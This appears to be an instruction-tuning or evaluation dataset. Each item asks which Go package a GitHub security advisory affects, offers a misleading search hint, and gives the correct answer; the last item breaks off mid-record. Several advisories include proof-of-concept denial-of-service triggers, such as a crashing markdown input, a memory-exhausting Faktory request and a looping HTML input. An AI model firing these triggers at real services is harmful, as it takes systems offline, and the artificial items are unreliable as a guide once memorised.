[{"id": "GHSA-24m5-r6hv-ccgp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nIn Cilium clusters where Cilium's Layer 7 proxy has been disabled, creating workloads with\n\n- `policy.cilium.io/proxy-visibility` annotations (in Cilium >= v1.13)\n- `io.cilium.proxy-visibility` annotations (in Cilium <= v1.12)\n\ncauses the Cilium agent to segfault on the node to which the workload is assigned.\n\nExisting traffic on the affected node will continue to flow, but the Cilium agent on the node will not able to process changes to workloads running on the node. This will also prevent workloads from being able to start on the affected node. The denial of service will be limited to the node on which the workload is scheduled, however an attacker may be able to schedule workloads on the node of their choosing, which could lead to targeted attacks.\n\n### Patches\n\n[Pull request with fix](https://github.com/cilium/cilium/pull/27597)\n\nThis issue affects:\n\nCilium <= v1.14.1\nCilium <= v1.13.6\nCilium <= v1.12.13\n\nThis issue has been resolved in:\n\nCilium v1.14.2\nCilium v1.13.7\nCilium v1.12.14\n\n### Workarounds\n\nUsers can avoid this denial of service attack by enabling the Layer 7 proxy.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-7mp6-929p-pqhj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. The protocol requires a sender to provide its local IP addresses in cleartext via an `ips?` message.. Top 1 search result is go:github.com/usememos/memos. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc/v9."}]}, {"id": "GHSA-m9xq-6h2j-65r2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nParsing malformed markdown input with parser that uses parser.Mmark extension could result in out-of-bounds read vulnerability.\n\n### Details\nTo exploit the vulnerability, parser needs to have parser.Mmark extension set. The panic occurs inside the `citation.go` file on the line 69 when the parser tries to access the element past its length.\n\nhttps://github.com/gomarkdown/markdown/blob/7478c230c7cd3e7328803d89abe591d0b61c41e4/parser/citation.go#L69\n\n### PoC\n```go\npackage main\n\nimport (\n\t\"github.com/gomarkdown/markdown\"\n\t\"github.com/gomarkdown/markdown/parser\"\n)\n\nfunc main() {\n\text := parser.CommonExtensions |\n\t\tparser.Attributes |\n\t\tparser.OrderedListStart |\n\t\tparser.SuperSubscript |\n\t\tparser.Mmark\n\tp := parser.NewWithExtensions(ext)\n\n\tinp := []byte(\"[@]\")\n\tmarkdown.ToHTML(inp, p, nil)\n}\n```\n\n```bash\n$ go run main.go\npanic: runtime error: index out of range [1] with length 1\n\ngoroutine 1 [running]:\ngithub.com/gomarkdown/markdown/parser.citation(0x10?, {0x1400000e3f0, 0x14000141801?, 0x3}, 0x0?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/citation.go:69 +0x544\ngithub.com/gomarkdown/markdown/parser.link(0x14000152000?, {0x1400000e3f0?, 0x3?, 0x3?}, 0x14000141ad8?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:308 +0x1c0\ngithub.com/gomarkdown/markdown/parser.(*Parser).Inline(0x14000152000, {0x102d87f48, 0x14000076180}, {0x1400000e3f0, 0x3, 0x3})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/inline.go:38 +0xb8\ngithub.com/gomarkdown/markdown/parser.(*Parser).Parse.func1({0x102d87f48?, 0x14000076180}, 0x0?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:307 +0x8c\ngithub.com/gomarkdown/markdown/ast.NodeVisitorFunc.Visit(0x140000106e0?, {0x102d87f48?, 0x14000076180?}, 0x68?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:574 +0x38\ngithub.com/gomarkdown/markdown/ast.Walk({0x102d87f48, 0x14000076180}, {0x102d87348, 0x140000106e0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:546 +0x58\ngithub.com/gomarkdown/markdown/ast.Walk({0x102d877b0, 0x14000076120}, {0x102d87348, 0x140000106e0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:557 +0x144\ngithub.com/gomarkdown/markdown/ast.WalkFunc(...)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/ast/node.go:580\ngithub.com/gomarkdown/markdown/parser.(*Parser).Parse(0x14000152000, {0x1400000e3f0?, 0x0?, 0x0?})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/parser/parser.go:304 +0x16c\ngithub.com/gomarkdown/markdown.Parse({0x1400000e3f0?, 0x3f?, 0x14000141e38?}, 0x102c6b43c?)\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:53 +0x6c\ngithub.com/gomarkdown/markdown.ToHTML({0x1400000e3f0?, 0x0?, 0x60?}, 0x0?, {0x0, 0x0})\n\t/Users/demon/go/pkg/mod/github.com/gomarkdown/markdown@v0.0.0-20230916125811-7478c230c7cd/markdown.go:77 +0x30\nmain.main()\n\t/Users/demon/tools/markdown_cve_poc/main.go:17 +0x5c\nexit status 2\n```\n\n### Impact\nDenial of Service / panic\n. Top 1 search result is go:github.com/cilium/cilium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gomarkdown/markdown."}]}, {"id": "GHSA-86c6-3g63-5w64", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The Vault and Vault Enterprise (\"Vault\") Google Cloud secrets engine did not preserve existing Google Cloud IAM Conditions upon creating or updating rolesets. Fixed in Vault 1.13.0.. Top 1 search result is go:github.com/usememos/memos. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault."}]}, {"id": "GHSA-fwr2-64vr-xv9m", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nArgo CD Cluster secrets might be managed declaratively using Argo CD / kubectl apply. As a result, the full secret body is stored in`kubectl.kubernetes.io/last-applied-configuration` annotation. \n\nhttps://github.com/argoproj/argo-cd/pull/7139 introduced the ability to manage cluster labels and annotations. Since clusters are stored as secrets it also exposes the `kubectl.kubernetes.io/last-applied-configuration` annotation which includes full secret body. In order to view the cluster annotations via the Argo CD API, the user must have `clusters, get` RBAC access.\n\n**Note:** In many cases, cluster secrets do not contain any actually-secret information. But sometimes, as in bearer-token auth, the contents might be very sensitive.\n\n### Patches\n\nThe bug has been patched in the following versions:\n\n* 2.8.3\n* 2.7.14\n* 2.6.15\n\n### Workarounds\n\nUpdate/Deploy cluster secret with `server-side-apply` flag which does not use or rely on `kubectl.kubernetes.io/last-applied-configuration` annotation. Note: annotation for existing secrets will require manual removal.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd. Top 1 search result is go:github.com/lima-vm/lima. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2."}]}, {"id": "GHSA-j2gj-g3p9-7mrr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Improper Access Control in GitHub repository usememos/memos prior to 0.13.2. As of commit `c9aa2eeb9` access tokens which fail validation are rejected.. Top 1 search result is go:github.com/containers/buildah. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/usememos/memos."}]}, {"id": "GHSA-hp56-xvf4-g6wr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. When a custom shared secret is used, the sender and receiver may divulge parts of this secret to an untrusted Relay, as part of composing a room name.. Top 1 search result is go:github.com/usememos/memos. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc/v9."}]}, {"id": "GHSA-7g3v-4ggr-xvjf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. The shared secret, located on a command line, can be read by local users who list all processes and their arguments.. Top 1 search result is go:github.com/lima-vm/lima. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc/v9."}]}, {"id": "GHSA-x4hh-vjm7-g2jv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nFaktory web dashboard can suffer from denial of service by a crafted malicious url query param `days`.\n\n### Details\nThe vulnerability is related to how the backend reads the `days` URL query parameter in the Faktory web dashboard. The value is used directly without any checks to create a string slice. If a very large value is provided, the backend server ends up using a significant amount of memory and causing it to crash.\n\n### PoC\nTo reproduce this vulnerability, please follow these steps:\n\nStart the Faktory Docker and limit memory usage to 512 megabytes for better demonstration:\n```\n$ docker run --rm -it -m 512m \\\n  -p 127.0.0.1:7419:7419 \\\n  -p 127.0.0.1:7420:7420 \\\n  contribsys/faktory:latest\n``` \n\nSend the following request. The Faktory server will exit after a few seconds due to out of memory:\n\n```\n$ curl 'http://localhost:7420/?days=922337'\n```\n\n### Impact\n**Server Availability**: The vulnerability can crash the Faktory server, affecting its availability.\n**Denial of Service Risk**: Given that the Faktory web dashboard does not require authorization, any entity with internet access to the dashboard could potentially exploit this vulnerability. This unchecked access opens up the potential for a Denial of Service (DoS) attack, which could disrupt service availability without any conditional barriers to the attacker. \n. Top 1 search result is go:code.sajari.com/docconv. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/contribsys/faktory."}]}, {"id": "GHSA-g687-f2gx-6wm8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAll versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically, the said component extracts a user-controlled tar.gz file without validating the size of its inner files. As a result, a malicious, low-privileged user can send a malicious tar.gz file that exploits this vulnerability to the repo-server, thereby harming the system's functionality and availability. Additionally, the repo-server is susceptible to another vulnerability due to the fact that it does not check the extracted file permissions before attempting to delete them. Consequently, an attacker can craft a malicious tar.gz archive in a way that prevents the deletion of its inner files when the manifest generation process is completed.\n\n\n### Patches\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.15\n* v2.7.14\n* v2.8.3\n\n### Workarounds\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\nConfigure RBAC (Role-Based Access Control) and provide access for configuring applications only to a limited number of administrators. These administrators should utilize trusted and verified Helm charts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\nThis vulnerability was found & reported by GE Vernova \u2013 Amit Laish.\n\nThe Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue\n. Top 1 search result is go:github.com/envoyproxy/envoy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2 github.com/argoproj/argo-cd/v2."}]}, {"id": "GHSA-6xv5-86q9-7xr8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nFor Windows users of `github.com/cyphar/filepath-securejoin`, until v0.2.4 it was possible for certain rootfs and path combinations (in particular, where a malicious Unix-style `/`-separated unsafe path was used with a Windows-style rootfs path) to result in generated paths that were outside of the provided rootfs.\n\nIt is unclear to what extent this has a practical impact on real users, but given the possible severity of the issue we have released an emergency patch release that resolves this issue.\n\nThanks to  @pjbgf for discovering, debugging, and fixing this issue (as well as writing some tests for it).\n\n### Patches\nc121231e1276e11049547bee5ce68d5a2cfe2d9b is the patch fixing this issue. v0.2.4 contains the fix.\n\n### Workarounds\nUsers could use `filepath.FromSlash()` on all unsafe paths before passing them to `filepath-securejoin`.\n\n### References\nSee #9.. Top 1 search result is go:github.com/pomerium/pomerium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cyphar/filepath-securejoin."}]}, {"id": "GHSA-p45j-vfv5-wprq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn issue was found in RKE2 where an attacker with network access to RKE2 servers' supervisor port (TCP 9345) can force the TLS server to add entries to the certificate's Subject Alternative Name (SAN) list, through a stuffing attack, until the certificate grows so large that it exceeds the maximum size allowed by TLS client implementations. OpenSSL for example will raise an `excessive message size` error when this occurs. No authentication is necessary to perform this attack, only the ability to perform a TLS handshake against the supervisor port (TCP 9345).\n\nAffected servers will continue to operate, but clients (server or agent nodes) will fail to establish new connections when joining or rejoining the cluster, thus leading to a denial of service (DoS) attack.\n\n### Remediation\n\nUpgrade to a fixed release:\n- v1.28.1+rke2r1\n- v1.27.5+rke2r1\n- v1.26.8+rke2r1\n- v1.25.13+rke2r1\n- 1.24.17+rke2r1\n\nIf you are using RKE2 1.27 or earlier, you must also add the parameter `tls-san-security: true` to the RKE2 configuration to enable enhanced security for the supervisor's TLS SAN list. This option defaults to `true` starting with RKE2 1.28.\n\nNote that this flag changes the behavior of RKE2's supervisor listener. You should ensure that you configure `node-external-ip` on servers that will be connected to via an external IP, and add `tls-san` entries for any load-balancers or VIP addresses that will be associated with the supervisor port. External IPs and load-balancer/VIP addresses will no longer be added to the supervisor certificate's SAN list unless explicitly configured.\n\n### Mitigation\n\nIf you cannot upgrade to a fixed release, the certificate can be \"frozen\" by running the following command against the cluster:\n\n```shell\nkubectl annotate secret -n kube-system rke2-serving listener.cattle.io/static=true\n```\n\n**\u26a0\ufe0f IMPORTANT CAUTION:** Note that this mitigation will prevent the certificate from adding new SAN entries when servers join the cluster, and automatically renewing itself when it is about to expire. If you do this, you should delete the annotation when adding new servers to the cluster, or when the certificate is within 90 days of expiring, so that it can be updated. Once that is done, you can freeze it again.\n\nAffected certificates can be reset by performing the following steps:\n* Run `kubectl delete secret -n kube-system rke2-serving`\n* Delete `/var/lib/rancher/rke2/server/tls/dynamic-cert.json` from all servers, and restart the `rke2-server` service.\n\n### Background\n\nThe RKE2 supervisor listens on port TCP 9345 and uses the `rancher/dynamiclistener` library to dynamically generate TLS certificates that contain TLS Subject Alternative Names (SAN) for any host name or IP address requested by a client. This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in RKE2.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rke2/security/policy) for security related inquiries.\n- Open an issue in the [RKE2](https://github.com/rancher/rke2/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).. Top 1 search result is go:k8s.io/apiserver. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/rancher/rke2 github.com/rancher/rke2 github.com/rancher/rke2 github.com/rancher/rke2 github.com/rancher/rke2."}]}, {"id": "GHSA-rp65-jpc7-8h8p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly verify the permissions when managing/updating a bot allowing a\u00a0User Manager role with user edit permissions to manage/update bots.\n\n. Top 1 search result is go:github.com/apache/servicecomb-service-center. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-r5hm-mp3j-285g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThis vulnerability allows specially crafted requests to bypass authentication, affecting all SOCKS inbounds with user authentication.\n\n### Patches\n\nUpdate to sing-box 1.4.5 or 1.5.0-rc.5 and later versions.\n\n### Workarounds\n\nDon't expose the SOCKS5 inbound to insecure environments.\n. Top 1 search result is go:github.com/gen2brain/go-unarr. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/sagernet/sing-box github.com/sagernet/sing-box github.com/sagernet/sing."}]}, {"id": "GHSA-2g7r-9xq5-c6hv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos prior to 0.15.1.. Top 1 search result is go:k8s.io/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/usememos/memos."}]}, {"id": "GHSA-92hx-3mh6-hc49", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An authentication bypass vulnerability was discovered in kube-apiserver. This issue could allow a remote, authenticated attacker who has been given permissions \"update, patch\" the \"pods/ephemeralcontainers\" subresource beyond what the default is. They would then need to create a new pod or patch one that they already have access to. This might allow evasion of SCC admission restrictions, thereby gaining control of a privileged pod.. Top 1 search result is go:github.com/grafana/loki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/openshift/apiserver-library-go."}]}, {"id": "GHSA-vpjc-4jcv-jc29", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: NATS nats-server 2.2.0 through 2.7.4 allows directory traversal because of an unintended path to a management action from a management account.. Top 1 search result is go:github.com/traefik/traefik. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/nats-io/nats-server."}]}, {"id": "GHSA-m4hf-6vgr-75r2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn issue was found in K3s where an attacker with network access to K3s servers' apiserver/supervisor port (TCP 6443) can force the TLS server to add entries to the certificate's Subject Alternative Name (SAN) list, through a stuffing attack, until the certificate grows so large that it exceeds the maximum size allowed by TLS client implementations. OpenSSL for example will raise an `excessive message size` error when this occurs. No authentication is necessary to perform this attack, only the ability to perform a TLS handshake against the apiserver/supervisor port (TCP 6443).\n\nAffected servers will continue to operate, but clients (including both external administrative access with `kubectl` and server or agent nodes) will fail to establish new connections, thus leading to a denial of service (DoS) attack.\n\n### Remediation\n\nUpgrade to a fixed release:\n\n- v1.28.1+k3s1\n- v1.27.5+k3s1\n- v1.26.8+k3s1\n- v1.25.13+k3s1\n- v1.24.17+k3s1\n\nIf you are using K3s 1.27 or earlier, you must also add  the parameter `tls-san-security: true` to the K3s configuration to enable enhanced security for the supervisor's TLS SAN list. This option defaults to `true` starting with K3s 1.28.\n\nNote that this flag changes the behavior of K3s servers. You should ensure that you configure `node-external-ip` on servers that will be connected to via an external IP, and add `tls-san` entries for any load-balancers or VIP addresses that will be associated with the supervisor port. External IPs and load-balancer/VIP addresses will no longer be added to the supervisor certificate's SAN list unless explicitly configured.\n\n### Mitigation\n\nIf you cannot upgrade to a fixed release, the certificate can be \"frozen\" by running the following command against the cluster:\n\n```shell\nkubectl annotate secret -n kube-system k3s-serving listener.cattle.io/static=true\n```\n\n**\u26a0\ufe0f IMPORTANT CAUTION:** Note that this mitigation will prevent the certificate from adding new SAN entries when servers join the cluster, and automatically renewing itself when it is about to expire. If you do this, you should delete the annotation when adding new servers to the cluster, or when the certificate is within 90 days of expiring, so that it can be updated. Once that is done, you can freeze it again.\n\nAffected certificates can be reset by performing the following steps:\n1. Run `kubectl --server https://localhost:6444 delete secret -n kube-system k3s-serving`\n2. Delete `/var/lib/rancher/k3s/server/tls/dynamic-cert.json` from all servers, and restart the `k3s` service.\n\n### Background\n\nThe K3s apiserver/supervisor listener on port TCP 6443 and uses the `rancher/dynamiclistener` library to dynamically generate TLS certificates that contain TLS Subject Alternative Names (SAN) for any host name or IP address requested by a client. This is done to allow servers and external load-balancers to be added to the cluster without the administrator having to explicitly know and configure in advance a fixed list of endpoints that the supervisor may be hosted at.\n\nThe library allows the embedding application to configure a callback that is used to filter addresses requested by clients; but this was not previously implemented in K3s.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the [K3s Security team](https://github.com/k3s-io/k3s/security/policy) for security related inquiries.\n- Open an issue in the [K3s](https://github.com/k3s-io/k3s/issues/new/choose) repository.\n- Verify with our [support matrix](https://www.suse.com/suse-k3s/support-matrix/all-supported-versions) and [product support lifecycle](https://www.suse.com/lifecycle/#k3s).. Top 1 search result is go:github.com/google/go-attestation. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/k3s-io/k3s github.com/k3s-io/k3s github.com/k3s-io/k3s github.com/k3s-io/k3s github.com/k3s-io/k3s."}]}, {"id": "GHSA-w23q-4hw3-2pp6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAll users on Windows are impacted. MinIO fails to filter the `\\` character, which allows for arbitrary object placement across\nbuckets. As a result, a user with low privileges, such as an access key, service account, or STS credential, which only has permission to `PutObject` in a specific bucket, can create an admin user.\n\n### Patches\nThere are two patches that fix this problem comprehensively\n\n```\ncommit b3c54ec81e0a06392abfb3a1ffcdc80c6fbf6ebc\nAuthor: Harshavardhana <harsha@minio.io>\nDate:   Mon Mar 20 13:16:00 2023 -0700\n\n    reject object names with '\\' on windows (#16856)\n```\n\n```\ncommit 8d6558b23649f613414c8527b58973fbdfa4d1b8\nAuthor: Harshavardhana <harsha@minio.io>\nDate:   Mon Mar 20 00:35:25 2023 -0700\n\n    fix: convert '\\' to '/' on windows (#16852)\n```\n\n### Workarounds\nThere are no known workarounds\n\n### References\nThe vulnerable code:\n```go\n// minio/cmd/generic-handlers.go\n// Check if the incoming path has bad path components,\n// such as \"..\" and \".\"\n// SlashSeparator -> /\n// dotdotComponent -> ..\n// dotComponent -> .\nfunc hasBadPathComponent(path string) bool {\n  path = strings.TrimSpace(path)\n  for _, p := range strings.Split(path, SlashSeparator) {\n    switch strings.TrimSpace(p) {\n    case dotdotComponent:\n      return true\n    case dotComponent:\n      return true\n    }\n  }\n  return false\n}\n```\n. Top 1 search result is go:github.com/beego/beego. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/minio/minio."}]}, {"id": "GHSA-6f4m-j56w-55c3", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A content spoofing vulnerability was found in Kiali. It was discovered that Kiali does not implement error handling when the page or endpoint being accessed cannot be found. This issue allows an attacker to perform arbitrary text injection when an error response is retrieved from the URL being accessed.. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kiali/kiali."}]}, {"id": "GHSA-4xp2-w642-7mcx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn attacker with the ability to create or modify CiliumNetworkPolicy objects in a particular namespace is able to affect traffic on an entire Cilium cluster, potentially bypassing policy enforcement in other namespaces.\n\nBy using a crafted `endpointSelector` that uses the `DoesNotExist` operator on the `reserved:init` label, the attacker can create policies that bypass namespace restrictions and affect the entire Cilium cluster. This includes potentially allowing or denying all traffic.\n\nThis attack requires API server access, as described in the [Kubernetes API Server Attacker](https://docs.cilium.io/en/stable/security/threat-model/#kubernetes-api-server-attacker) section of the Cilium Threat Model.\n\n### Patches\n\nThis issue was patched in https://github.com/cilium/cilium/pull/28007\n\nThis issue affects:\n\n- Cilium <= v1.14.1\n- Cilium <= v1.13.6\n- Cilium <= v1.12.13\n\nThis issue has been resolved in:\n\n- Cilium v1.14.2\n- Cilium v1.13.7\n- Cilium v1.12.14\n\n### Workarounds\n\nAn admission webhook can be used to prevent the use of `endpointSelector`s that use the `DoesNotExist` operator on the `reserved:init` label in CiliumNetworkPolicies.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Palantir and Isovalent to prepare these mitigations. Special thanks to @odinuge for reporting this issue and @joestringer for the fix.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nIf you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list at [security@cilium.io](mailto:security@cilium.io) first, before disclosing it in any public forum. This is a private mailing list for Cilium's internal security team, and your report will be treated as top priority. . Top 1 search result is go:github.com/mattermost/mattermost. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-96gq-6ch5-mm54", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Improper Input Validation in GitHub repository usememos/memos prior to 0.13.2.. Top 1 search result is go:k8s.io/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/usememos/memos."}]}, {"id": "GHSA-pj2h-85jq-g5vg", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Missing Authentication for Critical Function in GitHub repository answerdev/answer prior to v1.1.3.. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/answerdev/answer."}]}, {"id": "GHSA-ppjg-v974-84cm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nA vulnerable node, can be made to consume unbounded amounts of memory when handling specially crafted p2p messages sent from an attacker node.\n\n### Details\n\nThe p2p handler spawned a new goroutine to respond to `ping` requests. By flooding a node with ping requests, an unbounded number of goroutines can be created, leading to resource exhaustion and potentially crash due to OOM.\n\n### Patches\n\nThe fix is included in geth version `1.12.1-stable`, i.e, `1.12.2-unstable` and onwards. \n\nFixed by https://github.com/ethereum/go-ethereum/pull/27887\n\n### Workarounds\n\nNo known workarounds. \n\n### Credits\n\nThis bug was reported by Patrick McHardy and reported via [bounty@ethereum.org](mailto:bounty@ethereum.org). \n\n### References\n\n. Top 1 search result is go:github.com/hashicorp/consul. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/ethereum/go-ethereum."}]}, {"id": "GHSA-5j6p-59cj-j6cp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Improper Privilege Management in GitHub repository usememos/memos prior to 0.13.2.. Top 1 search result is go:code.gitea.io/gitea. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/usememos/memos."}]}, {"id": "GHSA-vfw5-hrgq-h5wf", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: The html package (aka x/net/html) through 2018-09-25 in Go mishandles `<table><math><select><mi><select></table>`, leading to an infinite loop during an `html.Parse` call because `inSelectIM` and `inSelectInTableIM` do not comply with a specification.. Top 1 search result is go:github.com/traefik/traefik. What is the affected package?"}, {"from": "gpt", "value": "The affected package is golang.org/x/net."}]}, {"id": "GHSA-5crw-6j7v-xc72", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nA malicious user can upload an SVG image containing JavaScript to their server. When matrix-media-repo is asked to serve that media via the `/_matrix/media/(r0|v3)/download` endpoint, it would be served with a `Content-Disposition` of `inline`. This can allow JavaScript to run in the browser if a client links to the `/download` endpoint directly.\n\nServer operators which do not share a domain between matrix-media-repo and other services are not affected, but are encouraged to upgrade regardless.\n\n### Patches\nhttps://github.com/turt2live/matrix-media-repo/commit/77ec2354e8f46d5ef149d1dcaf25f51c04149137 and https://github.com/turt2live/matrix-media-repo/commit/bf8abdd7a5371118e280c65a8e0ec2b2e9bdaf59 fix the issue. Operators should upgrade to v1.3.0 as soon as possible.\n\n### Workarounds\nThe `Content-Disposition` header can be overridden by the reverse proxy in front of matrix-media-repo to always use `attachment`, defeating this issue at the cost of \"worse\" user experience when clicking download links.\n\n### References\nhttps://developer.mozilla.org/en-US/docs/Web/SVG/Element/script\n\n. Top 1 search result is go:github.com/grafana/grafana. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/turt2live/matrix-media-repo."}]}, {"id": "GHSA-364c-vvqx-446c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. A sender may place ANSI or CSI escape sequences in a filename to attack the terminal device of a receiver. . Top 1 search result is go:github.com/envoyproxy/envoy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc/v9."}]}, {"id": "GHSA-h24c-6p6p-m3vx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThe specification of the GG18 threshold ECDSA signature protocol contains a vulnerability allowing an attacker to recover the shared secret key. If a participant generates a Paillier modulus `N` containing small factors (less than `2^100`) they can interact with other participants in the signing protocol to steal their secret key shares in as little as sixteen signing attempts. The master key can then be reconstructed from these shares.\n\n### Patches\n\nThe implementation of GG18 in tss-lib did not prove that 